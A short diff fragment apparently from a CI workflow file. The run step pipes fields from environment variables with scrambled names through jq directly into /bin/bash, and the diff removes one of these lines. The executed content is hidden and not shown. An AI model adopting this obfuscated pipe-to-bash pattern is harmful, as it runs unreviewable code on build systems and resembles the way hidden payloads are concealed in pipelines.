@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$kndr527" | jq -r .k57989 | /bin/bash
           printf '%s' "$hef3" | jq -r .ejnx862 | /bin/bash
-          printf '%s' "$fwuq8" | jq -r .aptvl84072 | /bin/bash
           echo $diue9 | jq -r .lpy7526 | /bin/bash
 
       - name: Save data
